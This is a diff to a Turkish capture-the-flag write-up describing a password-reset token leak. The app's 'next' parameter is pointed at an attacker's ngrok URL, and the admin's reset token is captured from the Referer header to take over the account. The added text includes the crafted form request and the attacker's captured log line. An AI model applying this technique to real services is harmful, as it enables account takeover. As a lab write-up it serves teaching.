@@ -101,7 +101,7 @@ Peki, bu düzenlenen payload'da kullanıcı adını yöneticilerin kullanıcı a
 
 Şifre sıfırlama bağlantılarının formatını inceleyelim:
 
-`http://soru.bayraksende.com:2999/reset-password?token=ca208519-0339-4ce4-89a3-cbdc21c7f3c5&next=http://soru.bayraksende.com:2999/login`
+`http://soru.bayraksende.com:2999/reset-password?token=fc8eba6f-dfb3-4776-9a4c-503417303a78&next=http://soru.bayraksende.com:2999/login`
 
 
 Bağlantı, post istek gövdemizde verdiğimiz 'next' alanını ve sunucu tarafında oluşturulması muhtemel olan bir şifre sıfırlama tokenını içeriyor.
@@ -139,6 +139,29 @@ Bu bize çıktı olarak tüm herkesin erişebileceği bir url verecektir, örne�
 
 
 `https://xxxx-xxxx-xxxx-xxxx-xxxx.ngrok-free.app`
+
+Şimdi, bu url'yi isteğimizin içine koyalım, ve kullanıcı adı kısmını admin ile değiştirelim:
+
+
+```formdata
+------WebKitFormBoundarym7tRlaLaR4ztC8jN
+Content-Disposition: form-data; name="admin"
+
+kullanici_adi
+------WebKitFormBoundarym7tRlaLaR4ztC8jN
+Content-Disposition: form-data; name="next"
+
+https://xxxx-xxxx-xxxx-xxxx-xxxx.ngrok-free.app
+------WebKitFormBoundarym7tRlaLaR4ztC8jN--
+```
+
+İsteğimizi gönderip sunucu konsolumuza baktığımzda, aşağıdakine benzer bir çıktı gelecektir:
+
+
+`2025-05-30T12:34:56.789Z - IP: ::ffff:127.0.0.1, Referer: http://soru.bayraksende.com:2999/reset-password?token=fa18d596-6557-47c0-b148-bed4cb96de30&mext=...`
+
+
+Bu url'nin uuid token'a olan kısmını alarak ziyaret ettiğimizde, admin kullanıcısı için şifre sıfırlama erişimi elde etmekteyiz. Şifremizi sıfırlayıp yeni şifremiz ile giriş yapabiliriz.
 
 
 
